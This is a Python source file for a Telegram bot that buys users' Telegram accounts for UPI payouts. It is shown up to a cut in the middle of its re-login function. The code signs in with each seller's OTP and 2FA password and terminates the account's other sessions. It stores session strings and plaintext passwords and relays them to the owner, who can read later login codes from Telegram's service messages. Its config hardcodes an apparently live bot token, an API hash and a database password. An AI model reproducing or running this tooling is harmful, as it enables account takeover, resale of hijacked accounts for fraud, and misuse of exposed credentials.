"""
==========================================================
  ZUDO ACCOUNT SELLER BOT  (v4 — MongoDB + Owner Controls)
==========================================================

Key changes vs v3:
 - MongoDB persistence (users, accounts, withdrawals, countries, retries)
 - Country list is now OWNER-managed.
     * Default seed: only  🇮🇳 India (+91)  @ ₹25
     * Owner adds more via  /addcountry
     * User CANNOT type a custom country anymore
     * User CANNOT set the price — owner sets price per country
 - Retry flow: after "other sessions active" warning, a second
   Hinglish message is sent asking user to terminate other logins
   (except this bot) and press Retry.
 - Reject flow: seller gets a message → they type /login → bot
   asks phone → sends OTP → seller submits OTP (+ optional 2FA)
   → owner can fetch OTP via same inline button.
 - Withdraw: min ₹10, and the *button-triggered* amount input
   now works (previous no-response bug fixed by restructuring
   handler group priority).
 - Owner:  /add <uid> <amt>   /deduct <uid> <amt>   /allbal
 - /help  lists every command.

Install:
    pip install python-telegram-bot==20.7 telethon==1.36.0 \
                pyrogram==2.0.106 tgcrypto pymongo==4.8.0 \
                dnspython==2.6.1

Run:
    python account_seller_bot.py
"""

import asyncio
import logging
import os
import re
import secrets
import struct
from base64 import urlsafe_b64encode
from datetime import datetime
from pathlib import Path

from pymongo import MongoClient, ReturnDocument
from pymongo.errors import PyMongoError

from telegram import (
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    Update,
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CallbackQueryHandler,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

from telethon import TelegramClient
from telethon.errors import (
    PhoneNumberInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    FloodWaitError,
)
from telethon.sessions import StringSession
from telethon.tl.functions.account import (
    GetAuthorizationsRequest,
    ResetAuthorizationRequest,
)

# =========================================================
# CONFIG
# =========================================================
BOT_TOKEN   = "8645471643:AAE3Ms7s7j6MJJ4d21JGD4a_FMQ5A-U7_1g"
API_ID      = 33628258
API_HASH    = "0850762925b9c1715b9b122f7b753128"
OWNER_ID    = 7661825494

MONGO_URL   = "mongodb+srv://moderatorhelperorg_db_user:nze86usap2dYthZN@cluster0.uokrixs.mongodb.net/mydatabase?retryWrites=true&w=majority"
MONGO_DB    = "zudo_bot"

SESSIONS_DIR = "account_sessions"
Path(SESSIONS_DIR).mkdir(exist_ok=True)

MIN_WITHDRAW = 10.0   # ₹10 minimum

# Conversation states
(
    SELL_COUNTRY,
    SELL_PHONE,
    SELL_OTP,
    SELL_2FA,
    WITHDRAW_AMOUNT,
    WITHDRAW_UPI,
    OWNER_LOGIN_PHONE,
    ADDCOUNTRY_NAME,
    ADDCOUNTRY_PRICE,
    RELOGIN_PHONE,
    RELOGIN_OTP,
    RELOGIN_2FA,
) = range(12)

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
)
logger = logging.getLogger("ZudoBot")

# =========================================================
# MONGODB
# =========================================================
mongo = MongoClient(MONGO_URL, serverSelectionTimeoutMS=15000)
db    = mongo[MONGO_DB]

col_users       = db["users"]
col_accounts    = db["accounts"]
col_withdrawals = db["withdrawals"]
col_countries   = db["countries"]
col_meta        = db["meta"]

# Indexes
try:
    col_users.create_index("user_id", unique=True)
    col_accounts.create_index("phone", unique=True)
    col_withdrawals.create_index("wid", unique=True)
    col_countries.create_index("code", unique=True)
except PyMongoError as e:
    logger.warning(f"index create: {e}")

# ---- helpers ----
def ensure_default_country():
    if col_countries.count_documents({}) == 0:
        col_countries.insert_one({
            "code":  "+91",
            "name":  "🇮🇳 India",
            "price": 25.0,
            "ts":    datetime.utcnow().isoformat(),
        })
        logger.info("Seeded default country: 🇮🇳 India ₹25")

ensure_default_country()


def get_user(uid: int) -> dict:
    doc = col_users.find_one_and_update(
        {"user_id": uid},
        {"$setOnInsert": {
            "user_id": uid,
            "balance": 0.0,
            "sold":    0,
            "history": [],
            "upi":     "",
        }},
        upsert=True,
        return_document=ReturnDocument.AFTER,
    )
    return doc


def update_user(uid: int, updates: dict):
    col_users.update_one({"user_id": uid}, updates)


def push_history(uid: int, line: str):
    col_users.update_one(
        {"user_id": uid},
        {"$push": {"history": {"$each": [line], "$slice": -50}}},
    )


def next_counter(name: str) -> int:
    doc = col_meta.find_one_and_update(
        {"_id": name},
        {"$inc": {"value": 1}},
        upsert=True,
        return_document=ReturnDocument.AFTER,
    )
    return int(doc["value"])


def list_countries() -> list:
    return list(col_countries.find({}, {"_id": 0}).sort("ts", 1))


def find_country(code: str):
    return col_countries.find_one({"code": code}, {"_id": 0})


# =========================================================
# UNIQUE session backup file name
# =========================================================
def make_unique_session_path(phone: str) -> str:
    digits = re.sub(r"\D", "", phone) or "unknown"
    stamp  = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    rand   = secrets.token_hex(3)
    return os.path.join(SESSIONS_DIR, f"{digits}_{stamp}_{rand}.session")


# =========================================================
# PYROGRAM STRING SESSION
# =========================================================
_PYRO_STRUCT = ">BI?256sQ?"

def telethon_to_pyrogram_string(client: TelegramClient, user_id: int, is_bot: bool = False) -> str:
    try:
        dc_id    = client.session.dc_id
        auth_key = client.session.auth_key.key
        packed   = struct.pack(
            _PYRO_STRUCT,
            dc_id,
            API_ID,
            False,
            auth_key,
            user_id,
            is_bot,
        )
        return urlsafe_b64encode(packed).decode("ascii").rstrip("=")
    except Exception as e:
        logger.warning(f"pyrogram string gen failed: {e}")
        return ""


# =========================================================
# IN-MEMORY caches
# =========================================================
PENDING: dict = {}          # phone -> pending submission dict (during retry flow)
RELOGIN: dict = {}          # user_id -> re-login state


# =========================================================
# KEYBOARDS
# =========================================================
def main_menu_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💸 Sell Account",     callback_data="sell")],
        [InlineKeyboardButton("💰 Balance",          callback_data="balance"),
         InlineKeyboardButton("🏧 Withdraw",         callback_data="withdraw")],
        [InlineKeyboardButton("📜 History",          callback_data="history"),
         InlineKeyboardButton("ℹ️ Help",             callback_data="help")],
        [InlineKeyboardButton("📢 Check OTP Status", url="https://t.me/zudootpbot")],
    ])

def cancel_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])

def back_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back")]])

def retry_kb(phone: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔄 Retry Request", callback_data=f"retry:{phone}")],
        [InlineKeyboardButton("❌ Cancel",        callback_data=f"abort:{phone}")],
    ])

def country_kb() -> InlineKeyboardMarkup:
    rows, row = [], []
    for c in list_countries():
        label = f"{c['name']} ({c['code']}) — ₹{c['price']:.0f}"
        row.append(InlineKeyboardButton(label, callback_data=f"ctry:{c['code']}"))
        rows.append(row); row = []   # one per row for clarity
    rows.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel")])
    return InlineKeyboardMarkup(rows)


# =========================================================
# /start /help
# =========================================================
WELCOME_TEXT = (
    "👋 <b>Welcome to ZUDO Account Seller Bot</b>\n\n"
    "💼 <b>Sell your virtual Telegram accounts</b> safely and get paid to your UPI.\n\n"
    "🛒 <b>How it works:</b>\n"
    "1️⃣  Tap 💸 <b>Sell Account</b>\n"
    "2️⃣  Choose the account's country (owner-set price)\n"
    "3️⃣  Send the phone number (with country code)\n"
    "4️⃣  Enter the OTP received on Telegram\n"
    "5️⃣  Other sessions are auto-logged-out\n"
    "6️⃣  On verification, balance is credited\n"
    "7️⃣  Withdraw via UPI (min ₹10) using /withdraw\n\n"
    "📢 Check OTP status → @zudootpbot\n\n"
    "⚠️ Do not log back into the account after submitting — it will reverse the sale.\n\n"
    "👇 Choose an option below:"
)

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    get_user(update.effective_user.id)
    await update.message.reply_text(
        WELCOME_TEXT, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb()
    )

HELP_TEXT_USER = (
    "ℹ️ <b>Commands</b>\n\n"
    "/start — Main menu\n"
    "/sell — Sell an account\n"
    "/balance — Check balance\n"
    "/withdraw — Withdraw to UPI (min ₹10)\n"
    "/history — Your recent activity\n"
    "/login — Re-login a rejected account\n"
    "/cancel — Cancel current action\n"
    "/help — Show this message\n\n"
    "💬 Support: contact owner."
)

HELP_TEXT_OWNER = HELP_TEXT_USER + (
    "\n\n👑 <b>Owner-only commands</b>\n"
    "/addcountry — Add a new country + price\n"
    "/delcountry &lt;code&gt; — Remove a country (e.g. /delcountry +1)\n"
    "/countries — List all countries\n"
    "/add &lt;user_id&gt; &lt;amount&gt; — Credit balance\n"
    "/deduct &lt;user_id&gt; &lt;amount&gt; — Debit balance\n"
    "/allbal — List users with balance ≥ ₹1\n"
    "/login — Access a submitted account (owner login panel)\n"
    "/stats — Bot statistics"
)

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = HELP_TEXT_OWNER if update.effective_user.id == OWNER_ID else HELP_TEXT_USER
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=back_kb())


# =========================================================
# MENU CALLBACKS
# =========================================================
async def menu_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    data = q.data

    if data == "back":
        await q.message.edit_text(WELCOME_TEXT, parse_mode=ParseMode.HTML, reply_markup=main_menu_kb())
        return ConversationHandler.END

    if data == "cancel":
        cli = context.user_data.get("client")
        if cli:
            try: await cli.disconnect()
            except: pass
        context.user_data.clear()
        try:
            await q.message.edit_text("❌ Action cancelled.\n\nReturning to main menu…", reply_markup=main_menu_kb())
        except:
            await q.message.reply_text("❌ Action cancelled.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    if data == "balance":
        u = get_user(q.from_user.id)
        text = (
            f"💰 <b>Your Wallet</b>\n\n"
            f"Balance: ₹{u['balance']:.2f}\n"
            f"Total accounts sold: {u['sold']}\n"
            f"UPI on file: {u['upi'] or 'Not set'}"
        )
        await q.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=back_kb())
        return

    if data == "history":
        u = get_user(q.from_user.id)
        hist = u.get("history", [])
        if not hist:
            text = "📜 <b>History</b>\n\nNo records yet."
        else:
            lines = ["📜 <b>Recent Activity</b>\n"]
            for h in hist[::-1]:
                lines.append(f"• {h}")
            text = "\n".join(lines)
        await q.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=back_kb())
        return

    if data == "help":
        text = HELP_TEXT_OWNER if q.from_user.id == OWNER_ID else HELP_TEXT_USER
        await q.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=back_kb())
        return


# =========================================================
# SELL FLOW
# =========================================================
async def sell_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    countries = list_countries()
    if not countries:
        msg = "⚠️ No countries configured yet. Owner must add one via /addcountry."
        if update.callback_query:
            await update.callback_query.answer()
            await update.callback_query.message.edit_text(msg, reply_markup=main_menu_kb())
        else:
            await update.message.reply_text(msg, reply_markup=main_menu_kb())
        return ConversationHandler.END

    text = (
        "🌍 <b>Step 1 / 3 — Select Country</b>\n\n"
        "Choose the country of the account you want to sell.\n"
        "💡 <i>Price is fixed by the owner for each country.</i>"
    )
    if update.callback_query:
        q = update.callback_query
        await q.answer()
        await q.message.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=country_kb())
    else:
        await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=country_kb())
    return SELL_COUNTRY


async def sell_country(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()

    if q.data == "cancel":
        await q.message.edit_text("❌ Cancelled.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    code = q.data.split(":", 1)[1]
    c = find_country(code)
    if not c:
        await q.message.edit_text("❌ Country no longer available.", reply_markup=main_menu_kb())
        return ConversationHandler.END

    context.user_data["country"]      = c["name"]
    context.user_data["country_code"] = c["code"]
    context.user_data["price"]        = float(c["price"])

    await q.message.edit_text(
        f"✅ Country: <b>{c['name']}</b> ({c['code']})\n"
        f"💵 Price: <b>₹{c['price']:.2f}</b>\n\n"
        f"📱 <b>Step 2 / 3 — Phone Number</b>\n"
        f"Send the full phone number with country code.\n"
        f"Example: <code>{c['code']}9876543210</code>",
        parse_mode=ParseMode.HTML,
        reply_markup=cancel_kb(),
    )
    return SELL_PHONE


async def sell_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r"^\+?\d{7,15}$", phone):
        await update.message.reply_text(
            "⚠️ Invalid phone number. Format: +919876543210",
            parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
        )
        return SELL_PHONE
    if not phone.startswith("+"):
        phone = "+" + phone

    if col_accounts.find_one({"phone": phone}):
        await update.message.reply_text(
            "❌ This number has already been submitted in our system.",
            reply_markup=main_menu_kb(),
        )
        return ConversationHandler.END

    if phone in PENDING:
        old = PENDING.pop(phone)
        try: await old["client"].disconnect()
        except: pass

    context.user_data["phone"] = phone
    await update.message.reply_text("⏳ Sending OTP… please wait.")

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        context.user_data["client"] = client
        context.user_data["phone_code_hash"] = sent.phone_code_hash
        await update.message.reply_text(
            "📲 <b>Step 3 / 3 — Enter OTP</b>\n\n"
            "An OTP has been sent to your Telegram app.\n"
            "Type the code with <b>spaces between digits</b>.\n"
            "Example: if OTP is 12345, send <code>1 2 3 4 5</code>\n\n"
            "(Spaces prevent Telegram from auto-invalidating the code.)",
            parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
        )
        return SELL_OTP
    except PhoneNumberInvalidError:
        try: await client.disconnect()
        except: pass
        await update.message.reply_text("❌ Invalid phone number.", reply_markup=main_menu_kb())
        return ConversationHandler.END
    except FloodWaitError as e:
        try: await client.disconnect()
        except: pass
        await update.message.reply_text(
            f"⏳ Telegram flood-wait: please try again in {e.seconds} seconds.",
            reply_markup=main_menu_kb(),
        )
        return ConversationHandler.END
    except Exception as e:
        try: await client.disconnect()
        except: pass
        logger.exception("send_code error")
        await update.message.reply_text(
            f"❌ Error sending OTP: {e}",
            parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(),
        )
        return ConversationHandler.END


async def sell_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip().replace(" ", "").replace("-", "")
    phone = context.user_data.get("phone")
    client: TelegramClient = context.user_data.get("client")
    phone_code_hash = context.user_data.get("phone_code_hash")

    if not client or not phone:
        await update.message.reply_text("⚠️ Session expired. /start again.")
        return ConversationHandler.END

    await update.message.reply_text("🔐 Verifying OTP…")

    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        return await attempt_finalize(update, context, client, password=None)
    except SessionPasswordNeededError:
        await update.message.reply_text(
            "🔒 This account has 2-Step Verification (2FA).\nPlease send your 2FA password now:",
            parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
        )
        return SELL_2FA
    except PhoneCodeInvalidError:
        await update.message.reply_text(
            "❌ Invalid OTP. Try again (with spaces between digits):",
            reply_markup=cancel_kb(),
        )
        return SELL_OTP
    except PhoneCodeExpiredError:
        try: await client.disconnect()
        except: pass
        context.user_data.clear()
        await update.message.reply_text("❌ OTP expired. Please /sell again.", reply_markup=main_menu_kb())
        return ConversationHandler.END
    except Exception as e:
        try: await client.disconnect()
        except: pass
        context.user_data.clear()
        logger.exception("sign_in error")
        await update.message.reply_text(
            f"❌ Login failed: {e}",
            parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(),
        )
        return ConversationHandler.END


async def sell_2fa_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    password = update.message.text.strip()
    client: TelegramClient = context.user_data.get("client")
    if not client:
        await update.message.reply_text("⚠️ Session expired. /start again.")
        return ConversationHandler.END
    try:
        await client.sign_in(password=password)
        return await attempt_finalize(update, context, client, password=password)
    except Exception as e:
        await update.message.reply_text(
            f"❌ Wrong 2FA password: {e}\nTry again:",
            parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
        )
        return SELL_2FA


# =========================================================
# ATTEMPT FINALIZE + terminate other sessions
# =========================================================
async def terminate_other_sessions(client: TelegramClient):
    terminated = 0
    failed = []
    try:
        auths = await client(GetAuthorizationsRequest())
        for a in auths.authorizations:
            if a.current:
                continue
            try:
                await client(ResetAuthorizationRequest(hash=a.hash))
                terminated += 1
            except Exception as ex:
                label = f"{a.device_model or '?'} / {a.platform or '?'} / {a.app_name or '?'}"
                failed.append(f"{label}  ({ex})")
    except Exception as e:
        logger.warning(f"session enumeration failed: {e}")
        failed.append(f"(enumeration failed: {e})")
    return terminated, failed


HINGLISH_RETRY_NOTE = (
    "🙏 <b>Bhai ek kaam karo</b>\n\n"
    "Apne Telegram account ke <b>Settings → Devices</b> me jao aur "
    "<b>bot ki current session ko chhod kar</b> baaki saari active "
    "sessions/logins ko <b>Terminate</b> kar do.\n\n"
    "Uske baad upar wale <b>🔄 Retry Request</b> button pe click karo — "
    "phir bot dobara check karega aur account submit ho jayega.\n\n"
    "⚠️ Agar aap apna account kisi aur device pe logged-in rakhoge to submission fail hoti rahegi."
)


async def attempt_finalize(update: Update, context: ContextTypes.DEFAULT_TYPE,
                           client: TelegramClient, password):
    phone   = context.user_data["phone"]
    country = context.user_data["country"]
    price   = context.user_data["price"]
    user    = update.effective_user

    try:
        me = await client.get_me()
    except Exception as e:
        logger.exception("get_me failed")
        try: await client.disconnect()
        except: pass
        context.user_data.clear()
        await update.message.reply_text(
            f"❌ Couldn't fetch account info: {e}",
            parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(),
        )
        return ConversationHandler.END

    PENDING[phone] = {
        "client":   client,
        "user":     user,
        "country":  country,
        "price":    price,
        "password": password,
        "me":       me,
        "chat_id":  update.effective_chat.id,
        "attempts": 0,
    }

    terminated, failed = await terminate_other_sessions(client)

    if failed:
        names = "\n".join(f"• {n}" for n in failed[:10])
        await update.message.reply_text(
            f"⚠️ <b>Submission paused — other sessions still active</b>\n\n"
            f"Couldn't automatically log out:\n{names}\n\n"
            f"👉 Open Telegram → <b>Settings → Devices</b> on this account "
            f"and tap <b>Terminate</b> on the remaining sessions.\n\n"
            f"Then press <b>🔄 Retry Request</b> below.",
            parse_mode=ParseMode.HTML,
            reply_markup=retry_kb(phone),
        )
        # Extra Hinglish nudge (asked by owner)
        await update.message.reply_text(
            HINGLISH_RETRY_NOTE,
            parse_mode=ParseMode.HTML,
        )
        context.user_data.clear()
        return ConversationHandler.END

    await do_submit(context, phone, terminated_count=terminated)
    context.user_data.clear()
    return ConversationHandler.END


# =========================================================
# RETRY / ABORT
# =========================================================
async def retry_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer("Re-checking…")
    _, phone = q.data.split(":", 1)
    pend = PENDING.get(phone)
    if not pend:
        await q.message.edit_text(
            "⚠️ This submission has expired. Please /sell again.",
            reply_markup=main_menu_kb(),
        )
        return
    if pend["user"].id != q.from_user.id:
        await q.answer("Not your submission.", show_alert=True)
        return

    client = pend["client"]
    pend["attempts"] += 1

    terminated, failed = await terminate_other_sessions(client)

    if failed:
        names = "\n".join(f"• {n}" for n in failed[:10])
        await q.message.edit_text(
            f"⚠️ Still found active sessions ({len(failed)})\n\n{names}\n\n"
            f"Please terminate them manually and press 🔄 Retry Request again.\n\n"
            f"Attempt #{pend['attempts']}",
            parse_mode=ParseMode.HTML,
            reply_markup=retry_kb(phone),
        )
        await q.message.reply_text(HINGLISH_RETRY_NOTE, parse_mode=ParseMode.HTML)
        return

    await q.message.edit_text(
        "✅ All other sessions are now terminated.\nSubmitting your account…",
        parse_mode=ParseMode.HTML,
    )
    await do_submit(context, phone, terminated_count=terminated)


async def abort_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    _, phone = q.data.split(":", 1)
    pend = PENDING.pop(phone, None)
    if pend:
        try: await pend["client"].disconnect()
        except: pass
    await q.message.edit_text(
        "❌ Submission cancelled. Your account was NOT submitted.",
        parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(),
    )


# =========================================================
# DO SUBMIT
# =========================================================
async def do_submit(context: ContextTypes.DEFAULT_TYPE, phone: str, terminated_count: int):
    pend = PENDING.pop(phone, None)
    if not pend:
        return
    client   = pend["client"]
    user     = pend["user"]
    country  = pend["country"]
    price    = pend["price"]
    password = pend["password"]
    me       = pend["me"]
    chat_id  = pend["chat_id"]

    telethon_string = StringSession.save(client.session)
    pyro_string     = telethon_to_pyrogram_string(client, me.id, is_bot=False)

    # backup .txt file (safe unique name)
    session_file_path = ""
    try:
        unique_path = make_unique_session_path(phone)
        txt_path = unique_path.replace(".session", ".txt")
        with open(txt_path, "w", encoding="utf-8") as f:
            f.write(f"phone={phone}\n")
            f.write(f"telegram_id={me.id}\n")
            f.write(f"telethon_string={telethon_string}\n")
            f.write(f"pyrogram_string={pyro_string}\n")
        session_file_path = txt_path
    except Exception as e:
        logger.warning(f"backup file: {e}")

    try: await client.disconnect()
    except: pass

    col_accounts.update_one(
        {"phone": phone},
        {"$set": {
            "phone":             phone,
            "seller_id":         user.id,
            "seller_name":       user.full_name,
            "seller_username":   user.username or "",
            "country":           country,
            "price":             price,
            "telethon_string":   telethon_string,
            "pyrogram_string":   pyro_string,
            "password":          password or "",
            "telegram_id":       me.id,
            "first_name":        me.first_name or "",
            "username":          me.username or "",
            "status":            "pending_verification",
            "ts":                datetime.utcnow().isoformat(),
            "sessions_terminated": terminated_count,
            "session_file":      session_file_path,
        }},
        upsert=True,
    )

    push_history(
        user.id,
        f"{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} | Submitted {phone} ({country}) for ₹{price:.2f}"
    )

    try:
        await context.bot.send_message(
            chat_id,
            f"✅ <b>Account submitted successfully!</b>\n\n"
            f"📱 Number: <code>{phone}</code>\n"
            f"🌍 Country: {country}\n"
            f"💵 Price: ₹{price:.2f}\n"
            f"🔒 2FA: {'Yes' if password else 'No'}\n"
            f"🚪 Other sessions terminated: {terminated_count}\n\n"
            f"⏳ Your balance of ₹{price:.2f} will be released after verification.\n\n"
            f"📢 Monitor OTP status: @zudootpbot\n"
            f"💰 Use /withdraw to cash out (min ₹{MIN_WITHDRAW:.0f}).",
            parse_mode=ParseMode.HTML, reply_markup=main_menu_kb(),
        )
    except Exception as e:
        logger.warning(f"notify seller failed: {e}")

    owner_text = (
        f"🆕 <b>NEW ACCOUNT RECEIVED</b>\n\n"
        f"👤 Seller: {user.full_name} (@{user.username or '—'}) <code>{user.id}</code>\n"
        f"📱 Phone: <code>{phone}</code>\n"
        f"🌍 Country: {country}\n"
        f"💵 Price: ₹{price:.2f}\n"
        f"🔒 2FA password: <code>{password or 'None'}</code>\n"
        f"🆔 TG ID: <code>{me.id}</code>\n"
        f"👤 Name: {me.first_name or ''}  @{me.username or '—'}\n"
        f"🚪 Sessions terminated: {terminated_count}\n\n"
        f"🧷 <b>Pyrogram String Session:</b>\n<code>{pyro_string or '(generation failed)'}</code>"
    )
    owner_kb = InlineKeyboardMarkup([
        [InlineKeyboardButton("✅ Approve & Credit",  callback_data=f"approve:{phone}"),
         InlineKeyboardButton("❌ Reject",           callback_data=f"reject:{phone}")],
        [InlineKeyboardButton("📥 Fetch Last OTP",    callback_data=f"fetchotp:{phone}")],
    ])
    try:
        await context.bot.send_message(
            OWNER_ID, owner_text, parse_mode=ParseMode.HTML,
            reply_markup=owner_kb, disable_web_page_preview=True,
        )
    except Exception as e:
        logger.error(f"notify owner: {e}")


# =========================================================
# OWNER — APPROVE / REJECT / FETCH OTP
# =========================================================
async def owner_action_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    if q.from_user.id != OWNER_ID:
        await q.answer("Not authorised.", show_alert=True); return
    await q.answer()
    action, phone = q.data.split(":", 1)
    acc = col_accounts.find_one({"phone": phone})
    if not acc:
        await q.message.reply_text("Account not found in DB.")
        return

    if action == "approve":
        col_accounts.update_one({"phone": phone}, {"$set": {"status": "sold"}})
        col_users.update_one(
            {"user_id": acc["seller_id"]},
            {"$inc": {"balance": float(acc["price"]), "sold": 1}},
        )
        push_history(
            acc["seller_id"],
            f"{datetime.utcnow().strftime('%Y-%m-%d %H:%M')} | ✅ Sold {phone} +₹{acc['price']:.2f}"
        )
        try:
            await q.message.edit_text(
                (q.message.text_html or "") + "\n\n✅ <b>Approved &amp; credited.</b>",
                parse_mode=ParseMode.HTML,
            )
        except: pass
        try:
            await context.bot.send_message(
                acc["seller_id"],
                f"🎉 Your account <code>{phone}</code> has been verified &amp; sold!\n"
                f"💰 ₹{acc['price']:.2f} credited to your balance.\n\n"
                f"Use /withdraw to cash out.",
                parse_mode=ParseMode.HTML,
            )
        except: pass

    elif action == "reject":
        col_accounts.update_one({"phone": phone}, {"$set": {"status": "rejected"}})
        try:
            await q.message.edit_text(
                (q.message.text_html or "") + "\n\n❌ <b>Rejected.</b>",
                parse_mode=ParseMode.HTML,
            )
        except: pass
        # Notify seller with re-login instructions
        try:
            await context.bot.send_message(
                acc["seller_id"],
                f"❌ <b>Your submission <code>{phone}</code> was rejected by the owner.</b>\n\n"
                f"Agar aap chahte ho ki apna account <b>wapas login</b> karke access kar sako, "
                f"to bot ko command bhejo:\n\n"
                f"👉 <code>/login</code>\n\n"
                f"Bot aapse phone number puchega, phir OTP fetch karne ka button dega. "
                f"Agar 2FA hai to wo bhi bata dena — sab chal jayega.",
                parse_mode=ParseMode.HTML,
            )
        except: pass

    elif action == "fetchotp":
        await q.message.reply_text(f"⏳ Fetching last OTP for <code>{phone}</code>…", parse_mode=ParseMode.HTML)
        ts = acc.get("telethon_string") or ""
        otp_text = await fetch_last_otp(ts)
        await q.message.reply_text(otp_text, parse_mode=ParseMode.HTML)


async def fetch_last_otp(string_session: str) -> str:
    if not string_session:
        return "⚠️ No string session stored for this account."
    client = TelegramClient(StringSession(string_session), API_ID, API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return "⚠️ Session no longer authorised (account may have logged us out)."
        msgs = await client.get_messages(777000, limit=1)
        if not msgs:
            return "ℹ️ No messages from 777000 yet."
        m = msgs[0]
        text = m.message or "(no text)"
        m_code = re.search(r"(\d{5,7})", text)
        code = m_code.group(1) if m_code else "—"
        return (
            f"📩 <b>Latest message from Telegram (777000)</b>\n\n"
            f"🔑 Extracted code: <code>{code}</code>\n"
            f"🕒 Date: {m.date}\n\n"
            f"Full message:\n<code>{text[:1500]}</code>"
        )
    except Exception as e:
        return f"❌ Error: {e}"
    finally:
        try: await client.disconnect()
        except: pass


# =========================================================
# SELLER RE-LOGIN FLOW  ( /login  after reject )
# =========================================================
async def user_relogin_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Owner uses /login too, but owner flow is different — handle both
    if update.effective_user.id == OWNER_ID:
        return await owner_login(update, context)

    await update.message.reply_text(
        "🔐 <b>Re-login</b>\n\n"
        "Apna phone number bhejo (country code ke saath):\n"
        "Example: <code>+919876543210</code>",
        parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
    )
    return RELOGIN_PHONE


async def user_relogin_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip().replace(" ", "").replace("-", "")
    if not re.match(r"^\+?\d{7,15}$", phone):
        await update.message.reply_text(
            "⚠️ Invalid phone number. Format: +919876543210",
            parse_mode=ParseMode.HTML, reply_markup=cancel_kb(),
        )
        return RELOGIN_PHONE
    if not phone.startswith("+"):
        phone = "+" + phone

    # Must belong to this user and be rejected (or any status they own)
    acc = col_accounts.find_one({"phone": phone})
    if not acc or acc.get("seller_id") != update.effective_user.id:
        await update.message.reply_text(
            "❌ Yeh number aapke naam se system me nahi hai.",
            reply_markup=main_menu_kb(),
        )
        return ConversationHandler.END

    await update.message.reply_text("⏳ OTP bhej rahe hain… please wait.")

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        sent = await client.send_code_request(phone)
        context.user_data["relogin_client"] = client
        context.user_data["relogin_phone"]  = phone
        context.user_data["relogin_hash"]   = sent.phone_code_hash

        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📥 Fetch OTP (from bot side)", callback_data=f"reotp:{phone}")],
            [InlineKeyboardButton("❌ Cancel", callback_data="cancel")],
        ])
        await update.message.reply_text(
            f"📲 OTP <code>{phone}</code> par bhej diya gaya hai.\n\n"
            f"OTP type karo <b>with spaces</b> (e.g. <code>1 2 3 4 5</code>).\n\n"
            f"Agar aap khud OTP nahi le paa rahe to niche wale button se bot fetch kar dega "
            f"(agar previous session ab bhi authorised hai).",
            parse_mode=ParseMode.HTML, reply_markup=kb,
        )
        return RELOGIN_OTP
    except Exception as e:
        try: await client.disconnect()
        except: pass
        await update.message.reply_text(
            f"❌ OTP bhejne me error: {e}", reply_markup=main_menu_kb(),
        )
        return ConversationHandler.END


async def relogin_fetch_otp_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer("Fetching…")
    _, phone = q.data.split(":", 1)
    acc = col_accounts.find_one({"phone": phone})
    if not acc or acc.get("seller_id") != q.from_user.id:
        await q.message.reply_text("❌ Not authorised.")
        return
    ts = acc.get("telethon_string") or ""
    text = await fetch_last_otp(ts)
    await q.message.reply_text(text, parse_mode=ParseMode.HTML)


async def user_relogin_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
    code = update.message.text.strip().replace(" ", "").replace("-", "")
    client: TelegramClient = context.user_data.get("relogin_client")
    phone = context.user_data.get("relogin_phone")
    h = context.user_data.get("relogin_hash")
